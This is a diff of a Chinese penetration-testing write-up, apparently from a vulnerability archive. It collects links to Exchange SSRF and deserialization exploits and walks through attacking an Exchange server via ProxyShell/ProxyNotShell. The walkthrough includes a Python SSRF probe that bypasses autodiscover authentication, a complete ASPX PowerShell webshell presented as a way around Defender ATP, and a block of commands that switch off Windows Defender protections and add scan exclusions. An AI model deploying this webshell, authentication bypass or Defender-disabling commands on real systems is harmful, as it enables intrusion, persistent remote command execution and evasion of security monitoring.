@@ -15,31 +15,31 @@ source: "gelusus/wxvl 公众号漏洞文库"
 ## Exchange-SSRF导致的问题   
 ### host可控的SSRF  
   
-CVE-2018-8581   
+CVE-2018-8581   
   
-ssrf导致读取任意用户邮件   
+ssrf导致读取任意用户邮件   
   
-https://evi1cg.me/archives/CVE_2018_8581.html   
+https://evi1cg.me/archives/CVE_2018_8581.html   
   
-ssrf结合ntlmralay直接攻击dc   
+ssrf结合ntlmralay直接攻击dc   
   
 https://evi1cg.me/archives/Exchange_Privilege_Elevation.html  
 ### host不可控的SSRF  
   
 proxylogon:  
   
- https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html   
+ https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html   
   
 proxyshell:  
   
- https://blog.orange.tw/2021/08/proxyshell-a-new-attack-surface-on-ms-exchange-part-3.html   
+ https://blog.orange.tw/2021/08/proxyshell-a-new-attack-surface-on-ms-exchange-part-3.html   
   
 proxynotshell:  
   
- https://blog.caspersun.club/2022/12/19/proxynotshell/proxynotshell/  
+ https://blog.caspersun.club/2022/12/19/proxynotshell/proxynotshell/  
 ## exchange反序列化漏洞   
   
-cve-2020-0688 machinekey反序列化:   
+cve-2020-0688 machinekey反序列化:   
   
 https://www.zcgonvh.com/post/weaponizing_CVE-2020-0688_and_about_dotnet_deserialize_vulnerability.html  
   
@@ -50,7 +50,7 @@ CVE-2021-42321:
   
 CVE-2022-23277:  
   
- [DotNet安全-CVE-2022-23277漏洞复现](http://mp.weixin.qq.com/s?__biz=MzkwNjMyNzM1Nw==&mid=2247499229&idx=1&sn=089ef2477b4d07749cffcad2d6372479&chksm=c0e8998ff79f10991358d7a00ec49b51369fe5fa383a6fe0ef92c32fb78b555594f0773cee9b&scene=21#wechat_redirect)  
+ [DotNet安全-CVE-2022-23277漏洞复现](http://mp.weixin.qq.com/s?__biz=MzkwNjMyNzM1Nw==&mid=2247499229&idx=1&sn=089ef2477b4d07749cffcad2d6372479&chksm=c0e8998ff79f10991358d7a00ec49b51369fe5fa383a6fe0ef92c32fb78b555594f0773cee9b&scene=21#wechat_redirect)  
   
 # 从proxyshell入手  
   
@@ -79,15 +79,15 @@ CVE-2022-23277:
   
 安装了exchange的域会包含几个内置账户，可以尝试获取他们的dn：  
 ```
-BUILTIN_EMAILS = [
-    'Administrator',
-    'SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}',
-    'DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}'
-    'FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042',
-    'Migration.8f3e7716-2011-43e4-96b1-aba62d229136',
-    'SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}',
-    'SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}',
-    'SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}'
+BUILTIN_EMAILS = [
+    'Administrator',
+    'SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}',
+    'DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}'
+    'FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042',
+    'Migration.8f3e7716-2011-43e4-96b1-aba62d229136',
+    'SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}',
+    'SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}',
+    'SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}'
 ]
 
 ```  
@@ -164,16 +164,16 @@ powershell接口的判断用户身份是依赖于X-Rps-CAT参数，主要通过�
   
 填入https://github.com/7BitsTeam/ProxyMaybeShell/blob/main/proxynotshellcmd.py这个脚本后进行rce，这里遇到一个命令执行没回显的经典问题。目标是肯定不出网的，包括dns。只能写入文件，但该环境无法访问常规的exchange放webshell的目录，如owa/ecp/aspnet_client等。而autodiscover等目录虽然可以访问，但需要凭据。联系前面的内容我们很容易想到通过ssrf绕过autodiscover的认证，简单写一个探测脚本：  
 ```
-import requests
- 
+import requests
+ 
 base_url="https://10.0.102.210"
 original_url="autodiscover/1.txt"
 headers={}
 cookies={}
- 
-headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
-cookies["Email"] = "autodiscover/autodiscover.json?a=ictbv@pshke.pov"
-url = base_url + "/autodiscover/autodiscover.json?a=ictbv@pshke.pov/%s" % original_url
+ 
+headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
+cookies["Email"] = "autodiscover/autodiscover.json?a=ictbv@pshke.pov"
+url = base_url + "/autodiscover/autodiscover.json?a=ictbv@pshke.pov/%s" % original_url
 r=requests.get(url,headers=headers,cookies=cookies,verify=False)
 print(r.text)
 
@@ -197,44 +197,44 @@ print(r.text)
   
 但执行命令就会被拒绝，查看目录可以发现存在较新的windows definder atp，使用https://github.com/ThePacketBender/webshells/blob/master/POWERshell.aspx可以通过调用c# powershell相关的dll绕过definder部分限制。在这个漏洞利用的情境下使用控件表单的webshell非常麻烦，稍微修改一下webshell：  
 ```
-<%@ Page Language="C#" %>
-<%@ Import Namespace="System.Collections.ObjectModel"%>
-<%@ Import Namespace="System.Management.Automation"%>
-<%@ Import Namespace="System.Management.Automation.Runspaces"%>
-<%@ Assembly Name="System.Management.Automation,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31BF3856AD364E35"%>
- 
-<!DOCTYPE html>
- 
-<script Language="c#" runat="server">
- 
-    private static string powershelled(string scriptText)
-    {
-        try
-        {
-            Runspace runspace = RunspaceFactory.CreateRunspace();
-            runspace.Open();
- 
-            Pipeline pipeline = runspace.CreatePipeline();
-            pipeline.Commands.AddScript(scriptText);
-            pipeline.Commands.Add("Out-String");
- 
-            Collection<PSObject> results = pipeline.Invoke();
-            runspace.Close();
-            StringBuilder stringBuilder = new StringBuilder();
-            foreach (PSObject obj in results)
-                stringBuilder.AppendLine(obj.ToString());
- 
-            return stringBuilder.ToString();
-        }catch(Exception exception)
-        {
-            return string.Format("Error: {0}", exception.Message);
-        }
-    }
-    
-    protected void Page_Load(object sender, EventArgs e)
-    {
-       Response.Write(powershelled(Request.Params["cmd"]));
-    }
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Collections.ObjectModel"%>
+<%@ Import Namespace="System.Management.Automation"%>
+<%@ Import Namespace="System.Management.Automation.Runspaces"%>
+<%@ Assembly Name="System.Management.Automation,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31BF3856AD364E35"%>
+ 
+<!DOCTYPE html>
+ 
+<script Language="c#" runat="server">
+ 
+    private static string powershelled(string scriptText)
+    {
+        try
+        {
+            Runspace runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+ 
+            Pipeline pipeline = runspace.CreatePipeline();
+            pipeline.Commands.AddScript(scriptText);
+            pipeline.Commands.Add("Out-String");
+ 
+            Collection<PSObject> results = pipeline.Invoke();
+            runspace.Close();
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject obj in results)
+                stringBuilder.AppendLine(obj.ToString());
+ 
+            return stringBuilder.ToString();
+        }catch(Exception exception)
+        {
+            return string.Format("Error: {0}", exception.Message);
+        }
+    }
+    
+    protected void Page_Load(object sender, EventArgs e)
+    {
+       Response.Write(powershelled(Request.Params["cmd"]));
+    }
 </script>
 
 
@@ -250,32 +250,32 @@ print(r.text)
   
 通过c#调用powershell相关dll可以实现绕过ATP执行部分命令，但这样还不足够。我们可以使用powersell关闭definder的一些功能：  
 ```
-# Disables realtime monitoring
-Set-MpPreference -DisableRealtimeMonitoring $true
+# Disables realtime monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Disables scanning for downloaded files or attachments
-Set-MpPreference -DisableIOAVProtection $true
+# Disables scanning for downloaded files or attachments
+Set-MpPreference -DisableIOAVProtection $true
 
-# Disable behaviour monitoring
-Set-MPPreference -DisableBehaviourMonitoring $true
+# Disable behaviour monitoring
+Set-MPPreference -DisableBehaviourMonitoring $true
 
-# Make exclusion for a certain folder
-Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+# Make exclusion for a certain folder
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 
-# Disables cloud detection
-Set-MPPreference -DisableBlockAtFirstSeen $true
+# Disables cloud detection
+Set-MPPreference -DisableBlockAtFirstSeen $true
 
-# Disables scanning of .pst and other email formats
-Set-MPPreference -DisableEmailScanning $true
+# Disables scanning of .pst and other email formats
+Set-MPPreference -DisableEmailScanning $true
 
-# Disables script scanning during malware scans
-Set-MPPReference -DisableScriptScanning $true
+# Disables script scanning during malware scans
+Set-MPPReference -DisableScriptScanning $true
 
-# Exclude files by extension
-Set-MpPreference -ExclusionExtension "ps1"
+# Exclude files by extension
+Set-MpPreference -ExclusionExtension "ps1"
 
-# Turn off everything and set exclusion to "C:\Windows\Temp"
-Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+# Turn off everything and set exclusion to "C:\Windows\Temp"
+Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 
 ```  
   
